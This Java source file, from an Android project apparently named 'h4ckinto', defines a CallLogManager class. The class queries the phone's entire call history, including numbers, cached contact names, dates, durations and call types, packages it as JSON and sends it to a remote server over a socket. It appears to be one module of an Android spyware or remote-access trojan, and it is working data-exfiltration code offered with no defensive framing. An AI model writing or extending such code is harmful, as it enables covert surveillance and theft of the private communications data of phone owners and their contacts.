package com.h4ckinto.android.managers;

import android.content.Context;
import android.database.Cursor;
import android.provider.CallLog;
import android.util.Log;

import com.h4ckinto.android.network.SocketManager;
import com.h4ckinto.android.utils.PermissionManager;

import org.json.JSONArray;
import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class CallLogManager {
    private static final String TAG = "CallLogManager";
    
    private Context context;
    private SocketManager socketManager;

    public CallLogManager(Context context) {
        this.context = context;
        this.socketManager = SocketManager.getInstance(context);
    }

    public void getCallLogList() {
        if (!PermissionManager.hasCallLogPermission(context)) {
            Log.w(TAG, "Call log permission not granted");
            return;
        }

        try {
            List<JSONObject> callsList = new ArrayList<>();
            
            Cursor cursor = context.getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                new String[]{
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.DATE,
                    CallLog.Calls.DURATION,
                    CallLog.Calls.TYPE,
                    CallLog.Calls.CACHED_NAME
                },
                null,
                null,
                CallLog.Calls.DATE + " DESC"
            );

            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String phoneNumber = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                    long date = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
                    int duration = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                    int type = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                    String name = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME));
                    
                    // Clean phone number
                    phoneNumber = phoneNumber.replaceAll("[^0-9+]", "");
                    
                    JSONObject call = new JSONObject();
                    call.put("phoneNo", phoneNumber);
                    call.put("date", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date(date)));
                    call.put("duration", duration);
                    call.put("type", getCallTypeString(type));
                    call.put("name", name != null ? name : "");
                    callsList.add(call);
                }
                cursor.close();
            }

            JSONObject callData = new JSONObject();
            callData.put("callsList", new JSONArray(callsList));
            socketManager.sendCallData(callData);
            
            Log.d(TAG, "Call log sent to server: " + callsList.size() + " calls");
        } catch (Exception e) {
            Log.e(TAG, "Error getting call log", e);
        }
    }

    private String getCallTypeString(int type) {
        switch (type) {
            case CallLog.Calls.INCOMING_TYPE:
                return "Incoming";
            case CallLog.Calls.OUTGOING_TYPE:
                return "Outgoing";
            case CallLog.Calls.MISSED_TYPE:
                return "Missed";
            case CallLog.Calls.VOICEMAIL_TYPE:
                return "Voicemail";
            case CallLog.Calls.REJECTED_TYPE:
                return "Rejected";
            case CallLog.Calls.BLOCKED_TYPE:
                return "Blocked";
            case CallLog.Calls.ANSWERED_EXTERNALLY_TYPE:
                return "Answered Externally";
            default:
                return "Unknown";
        }
    }
}
